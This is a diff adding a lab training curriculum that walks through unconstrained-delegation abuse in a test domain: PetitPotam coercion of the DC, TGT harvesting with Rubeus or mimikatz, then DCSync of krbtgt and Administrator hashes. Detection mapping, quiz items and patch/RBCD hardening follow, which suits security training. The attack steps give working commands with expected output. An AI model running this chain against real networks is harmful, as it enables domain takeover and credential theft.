@@ -214,4 +214,391 @@ cost:
   cpu_pct: 0
   detectability: quiet
 
+curriculum:
+  title: "Unconstrained Delegation — coerce-then-steal TGT to DCSync"
+  summary: >
+    Walkthrough of T1134.001 + T1558.003 against `tlms01` (10.99.50.11),
+    which has TRUSTED_FOR_DELEGATION set on its computer account. You
+    enumerate the delegation surface, coerce the DC `tldc01` to
+    authenticate to tlms01 via PetitPotam, harvest the resulting
+    forwardable TGT for `TLDC01$` from LSASS on tlms01, then use that
+    TGT to DCSync the krbtgt + Administrator hashes.
+  learning_objectives:
+    - "Explain why TRUSTED_FOR_DELEGATION (UAC bit 0x80000) on a member server is a domain-takeover primitive."
+    - "Enumerate the unconstrained-delegation surface with PowerView / BloodHound / Impacket."
+    - "Use a coercion primitive (PetitPotam EFSRPC or PrinterBug) to force DC auth to a controlled host."
+    - "Extract a forwardable TGT from LSASS with Rubeus monitor / mimikatz sekurlsa::tickets."
+    - "Use the harvested TGT for DCSync and identify the Protected Users / NOT_DELEGATED mitigation chain."
+  prerequisites:
+    - "An active Cobalt Strike beacon on tlms01 (10.99.50.11) running as a LOCAL ADMIN (required to dump LSASS) — typical bootstrap path is to first pwn tlms01 via the Kerberoasting bolt-on's svc_kerb credential which has admin rights on the SQL host, then privesc to SYSTEM"
+    - "PetitPotam binary or Python script on the operator host — https://github.com/topotam/PetitPotam"
+    - "Rubeus.exe on tlms01 (drop via execute-assembly) — https://github.com/GhostPack/Rubeus"
+    - "Impacket >= 0.11 on Kali (192.168.1.100) for secretsdump.py"
+    - "TrustedSec's CS-Remote-OPs-BOF for dcsync/dump_lsass BOFs — https://github.com/trustedsec/CS-Remote-OPs-BOF"
+    - "DC patch level: Windows Server 2022 RTM without the May 2022 cumulative — PetitPotam EFSRPC is patched in newer cumulatives but the test lab DC is intentionally back-leveled"
+  estimated_total_minutes: 50
+  steps:
+    - id: "01-enumerate-delegation"
+      title: "Find every host with TRUSTED_FOR_DELEGATION"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 1 — Map the delegation surface
+
+        Any authenticated TESTLAB user can enumerate the delegation
+        surface. Four equivalent paths:
+
+        **Option A — Impacket from Kali**:
+
+        ```bash
+        # findDelegation.py lists every Trusted-for-Delegation / Constrained-Delegation / RBCD principal
+        findDelegation.py TESTLAB.LOCAL/j.doe:'Welcome1!' -dc-ip 10.99.50.10
+        ```
+
+        Expected:
+
+        ```
+        AccountName     AccountType     DelegationType         DelegationRightsTo
+        --------------  --------------  ---------------------  --------------------
+        TLMS01$         Computer        Unconstrained          N/A
+        ```
+
+        **Option B — PowerView from beacon on tlws01**:
+
+        ```
+        beacon> powerpick Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
+        ```
+
+        **Option C — BloodHound** (from Kali, ingested data already
+        collected by SharpHound):
+
+        ```bash
+        # Open BloodHound UI
+        bloodhound
+        # Run pre-built query "Find Computers with Unconstrained Delegation"
+        # The graph highlights TLMS01.TESTLAB.LOCAL as the pivot point
+        ```
+
+        **Option D — CS BOF** (from beacon):
+
+        TrustedSec CS-Situational-Awareness-BOF ships an `adcs_enum` and
+        a generic LDAP query BOF. Or use the Outflank Ldapsearch BOF:
+
+        ```
+        beacon> ldapsearch (&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))
+        ```
+
+        The `524288` is decimal for `0x80000` — TRUSTED_FOR_DELEGATION.
+        The result will include `TLMS01$`.
+
+        > **Elastic rule that fires**: none for read-only enumeration —
+        > LDAP queries by authenticated principals are baseline.
+    - id: "02-coerce-dc-auth"
+      title: "Coerce TLDC01$ to authenticate to TLMS01 (PetitPotam)"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 2 — Force the DC to send a TGT
+
+        Unconstrained delegation only matters if a high-value principal
+        actually AUTHENTICATES to the delegation host. To make that
+        happen, use a coercion primitive — PetitPotam (EFSRPC) is the
+        most reliable. The DC will authenticate to TLMS01 as its own
+        machine account `TLDC01$`, and because tlms01 is
+        TRUSTED_FOR_DELEGATION, the DC sends a FORWARDABLE TGT in the
+        Kerberos exchange.
+
+        ### Set up a TGT monitor on tlms01 first (before coercing!)
+
+        **Option A — Rubeus monitor from beacon on tlms01**:
+
+        ```
+        # On the beacon (running as SYSTEM on tlms01)
+        beacon> execute-assembly /opt/Rubeus/Rubeus.exe monitor /interval:5 /filteruser:TLDC01$
+        ```
+
+        Leave that running in a separate beacon tab — it will print
+        captured TGTs to the beacon output as they arrive.
+
+        **Option B — mimikatz sekurlsa::tickets**:
+
+        ```
+        beacon> mimikatz sekurlsa::tickets /export
+        ```
+
+        Saves every ticket in LSASS as `.kirbi` files to disk — pull
+        them with `download *.kirbi`.
+
+        ### Now coerce — from Kali
+
+        ```bash
+        # PetitPotam — EFSRPC coercion via MS-EFSR
+        python3 /opt/PetitPotam/PetitPotam.py \
+            -d testlab.local \
+            -u j.doe -p 'Welcome1!' \
+            10.99.50.11 \
+            10.99.50.10
+        ```
+
+        Arg order: `<listener IP (tlms01)> <victim IP (tldc01 DC)>`.
+
+        Expected output:
+
+        ```
+        [-] Connecting to ncacn_np:10.99.50.10[\PIPE\lsarpc]
+        [+] Connected!
+        [+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+        [+] Successfully bound!
+        [-] Sending EfsRpcOpenFileRaw!
+        [+] Got expected ERROR_BAD_NETPATH exception!!
+        [+] Attack worked!
+        ```
+
+        The DC just authenticated to tlms01. Switch to the Rubeus
+        monitor tab — you should see:
+
+        ```
+        [*] Action: TGT Harvesting
+
+        [*] Refresh Interval (sec)  : 5
+        [*] Target user filter      : TLDC01$
+        [*] Monitoring every 5 seconds for new TGTs
+
+        [*] 1/5/2026 14:33:21 UTC - Found new TGT:
+          User                  :  TLDC01$@TESTLAB.LOCAL
+          StartTime             :  1/5/2026 6:33:20 AM
+          EndTime               :  1/5/2026 4:33:20 PM
+          RenewTill             :  1/12/2026 6:33:20 AM
+          Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+          Base64EncodedTicket   :
+
+            doIFmDC...truncated...
+
+          [+] Ticket cache size: 1
+        ```
+
+        Note the `forwarded, forwardable` flags — that is the smoking
+        gun. The TGT is yours.
+
+        **Alternative coercion primitives** if PetitPotam is patched:
+        - **PrinterBug** (`SpoolSample.exe`, `dementor.py`) — exploits
+          MS-RPRN
+        - **DFSCoerce** (`dfscoerce.py`) — exploits MS-DFSNM
+        - **ShadowCoerce** (`shadowcoerce.py`) — exploits MS-FSRVP
+        - All are catalogued at https://github.com/p0dalirius/Coercer
+
+        > **Elastic rule that fires**: `Potential Kerberos Coercion via
+        > DNS-Based SPN Spoofing` (`f701be14-0a36-4e9a-a851-b3e20ae55f09`)
+        > — fires on the coercion-side traffic pattern. Coverage is
+        > indirect (catches the auth-flow anomaly, not PetitPotam
+        > specifically).
+      assessment:
+        question: "Why does the DC send a FORWARDABLE TGT to tlms01 instead of just a service ticket?"
+        options:
+          - "Forwardable is the Kerberos default for all TGS exchanges."
+          - "The TRUSTED_FOR_DELEGATION flag on tlms01's computer account causes the KDC to issue forwardable tickets in any AS-REQ / TGS-REQ targeting tlms01's SPNs."
+          - "PetitPotam injects the forwardable flag into the response."
+          - "The DC sends both a TGT and a TGS; the operator chooses which to harvest."
+        correct_index: 1
+        explanation: >
+          The TRUSTED_FOR_DELEGATION flag is the KDC's signal to issue
+          forwardable tickets for that host. When TLDC01$ authenticates
+          to TLMS01, the KDC sees TLMS01$ has TRUSTED_FOR_DELEGATION
+          set, and the AS/TGS exchange marks the TGT as forwardable.
+          A non-delegation host would get a service ticket only — no
+          TGT, no compromise. The flag is the entire vulnerability.
+    - id: "03-use-tgt-for-dcsync"
+      title: "Inject the harvested TGT and DCSync"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 3 — Pass-the-ticket → DCSync
+
+        With the forwardable TGT for `TLDC01$` in hand, inject it into
+        your beacon's logon session and authenticate as the DC machine
+        account. DC machine accounts are in the well-known
+        `Enterprise Domain Controllers` group, which has the
+        `DS-Replication-Get-Changes-All` extended right at the domain
+        NC — i.e., DCSync rights.
+
+        **Option A — Rubeus + DCSync BOF (from beacon on tlms01)**:
+
+        ```
+        # Inject the TGT into a new logon session
+        beacon> execute-assembly /opt/Rubeus/Rubeus.exe ptt /ticket:doIFmDC...truncated...
+
+        # Verify
+        beacon> klist
+
+        # DCSync via TrustedSec's dcsync BOF
+        beacon> inline-execute /opt/CS-Remote-OPs-BOF/SourceCode/dcsync/dcsync.x64.o TESTLAB.LOCAL krbtgt
+        ```
+
+        Expected (truncated):
+
+        ```
+        [*] Dumping krbtgt
+        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f3bc61e97fb14d18c42bcbf6c3a9055f:::
+        ```
+
+        **Option B — Impacket from Kali via TGT file**:
+
+        Export the TGT as `.ccache` and use it with `secretsdump.py`.
+        First convert the Rubeus base64 kirbi to ccache:
+
+        ```bash
+        # On Kali, after downloading the .kirbi from tlms01
+        ticketConverter.py /tmp/TLDC01.kirbi /tmp/TLDC01.ccache
+        export KRB5CCNAME=/tmp/TLDC01.ccache
+
+        # DCSync
+        secretsdump.py -k -no-pass -just-dc 'TESTLAB.LOCAL/TLDC01$@tldc01.testlab.local'
+        ```
+
+        Expected:
+
+        ```
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f3bc61e97fb14d18c42bcbf6c3a9055f:::
+        TESTLAB\ansible:1108:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
+        ```
+
+        Game over — `Administrator`, `krbtgt`, and the `ansible`
+        domain-admin-equivalent are now compromised.
+
+        > **Elastic rule that fires**: `DCSync via NetSync` and
+        > `Potential Credential Access via DCSync` — both fire on the
+        > DRSUAPI replication call from a non-DC source IP. The
+        > `Sensitive Privilege SeEnableDelegationPrivilege assigned to
+        > a User` rule (`f494c678-...`) fires on the install side, not
+        > here.
+    - id: "04-detection-mapping"
+      title: "How the SOC sees the chain"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 4 — Detection coverage and gaps
+
+        The manifest carries `coverage_status: partial` — two rules, no
+        single high-confidence chain detection. Defenders need to
+        stitch the signal themselves.
+
+        ### Rules mapped to this bolt-on
+
+        | Rule | UUID | Catches | Confidence |
+        |---|---|---|---|
+        | Sensitive Privilege SeEnableDelegationPrivilege assigned to a User | `f494c678-...` | Privilege assignment side; doesn't fire on direct UAC flips | Medium |
+        | Potential Kerberos Coercion via DNS-Based SPN Spoofing | `f701be14-...` | Coercion-phase traffic | Medium |
+
+        ### High-fidelity raw EVTX correlation
+
+        | Event | What it tells you |
+        |---|---|
+        | 4738 / 5136 | UAC change — TRUSTED_FOR_DELEGATION bit set (install side) |
+        | **4769** | **TGS-REQ for `cifs/TLMS01$` from TLDC01$ — the coercion-driven auth** |
+        | **4624 LogonType=3** | **TLDC01$ logged on to TLMS01 — should NEVER happen in normal ops** |
+        | Sysmon Event 10 | LSASS handle open from non-standard process (Rubeus monitor / mimikatz reading sekurlsa) |
+        | Sysmon Event 1 | rundll32.exe / unusual binary executing in SYSTEM context on tlms01 |
+
+        The canonical correlation rule (paraphrased from a Splunk SPL
+        often deployed by red-team-aware SOCs):
+
+        ```
+        # Within a 5-minute window:
+        # 1. DC machine account (e.g., TLDC01$) authenticates LogonType=3 to a non-DC member server
+        # 2. From that member server, a DRSUAPI / GetNCChanges replication call originates
+        # → CRITICAL alert: Unconstrained-delegation-driven DCSync
+        ```
+
+        Sysmon Event 10 on LSASS from `tlms01` while a TGT for TLDC01$
+        is fresh in cache is the strongest single-host signal — pin
+        alerting on `TargetImage:lsass.exe` from processes not in your
+        AV / endpoint allowlist.
+
+        > **Elastic rule that fires (coverage gap)**: there is no
+        > single Elastic-prebuilt rule that catches the full
+        > coerce-harvest-DCSync chain. The bolt-on's
+        > `fallback_rule_template` (Phase 4) will materialise a
+        > correlation EQL query.
+      assessment:
+        question: "Which single Windows event, on its own, is the highest-fidelity signal that unconstrained-delegation abuse has happened (not just been set up)?"
+        options:
+          - "Event 4738 — UAC change setting TRUSTED_FOR_DELEGATION"
+          - "Event 4624 LogonType=3 where the source is a DC machine account (TLDC01$) and the destination is a non-DC member server"
+          - "Event 4720 — user account created"
+          - "Event 4769 — TGS issued to any user"
+        correct_index: 1
+        explanation: >
+          A DC machine account logging on (LogonType=3, network logon)
+          to a non-DC member server is the smoking gun — DCs do not
+          normally authenticate outbound to member servers in business
+          flows. 4738 is the install-side signal (UAC change), 4720
+          fires on every user creation, and 4769 fires on every Kerberos
+          TGS request. The DC-as-logon-source pattern is what
+          distinguishes exploitation from setup.
+    - id: "05-patch-and-rbcd-migration"
+      title: "Patch + the right modern alternative (RBCD)"
+      estimated_minutes: 15
+      markdown: |
+        ## Step 5 — Patch the host and migrate to RBCD
+
+        Click **Patch** on this card. The bolt-on's patch block does
+        three things:
+
+        1. Clears TRUSTED_FOR_DELEGATION on `TLMS01$` (UAC bit 0x80000).
+        2. Sets NOT_DELEGATED (UAC bit 0x100000) — the account cannot
+           be delegated to by anyone, even an admin.
+        3. Adds `TLMS01$` to the `Protected Users` security group, which
+           CATEGORICALLY forbids unconstrained delegation regardless of
+           UAC flags (defence in depth).
+
+        Re-run step 2's PetitPotam coercion. The Rubeus monitor on
+        tlms01 will now show:
+
+        ```
+        [*] Action: TGT Harvesting
+        [*] Monitoring every 5 seconds for new TGTs
+        # (no output — the DC auth no longer ships a forwardable TGT)
+        ```
+
+        The DC still authenticates to tlms01, but the TGT it issues is
+        **not forwardable** — the cached ticket is useless for
+        delegation.
+
+        ### Migrate legitimate use cases to Resource-Based Constrained Delegation (RBCD)
+
+        If a real workload (e.g., IIS pool on tlms01 needing to
+        authenticate to a backend SQL service on a different host) was
+        relying on unconstrained delegation, migrate it to RBCD:
+
+        ```powershell
+        # Run from a DA on tldc01
+        # Allow tlms01's app pool identity to act as any user TO a specific backend service
+        Set-ADComputer -Identity TLSQL01 -PrincipalsAllowedToDelegateToAccount TLMS01$
+        ```
+
+        RBCD has three properties that make it dramatically safer:
+        - **Backend-controlled**: the target server (TLSQL01) decides
+          who can delegate to it, not a domain admin globally.
+        - **Service-scoped**: delegation is to ONE backend, not "any
+          service in the forest".
+        - **No coercion primitive**: RBCD requires the source service
+          to actively request impersonation — it cannot be passively
+          triggered by inbound auth.
+
+        ### Defensive hardening checklist
+
+        | Control | How |
+        |---|---|
+        | **Audit quarterly** for accounts with TRUSTED_FOR_DELEGATION | `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` should return only DCs (and only sometimes them) |
+        | **Add all Tier-0 accounts to Protected Users** | DAs, EAs, krbtgt's owners — Protected Users forbids unconstrained delegation, RC4, NTLM, and Kerberos-without-AES |
+        | **Set NOT_DELEGATED on Tier-0 identities** | UAC bit 0x100000 prevents the account from being delegated to even if a host is misconfigured |
+        | **Block coercion at the network layer** | Disable EFSRPC on DCs via registry (`AllowOpenEnumerationOnRemoteEndpoints=0`) where possible |
+        | **Monitor for new TRUSTED_FOR_DELEGATION** | Real-time alert on Event 4738 with the 0x80000 bit set |
+
+        > **Rollback**: the manifest declares `patch_revert` — clicking
+        > Revert removes tlms01 from Protected Users, clears NOT_DELEGATED,
+        > and re-sets TRUSTED_FOR_DELEGATION. The lab is re-armed.
+
+        > **Elastic rule that fires (mitigation phase)**: `Account
+        > Added to Privileged Group` may fire on the Protected Users
+        > membership change — pair with a change-control allowlist to
+        > suppress legitimate hardening operations.
+
 status: stable
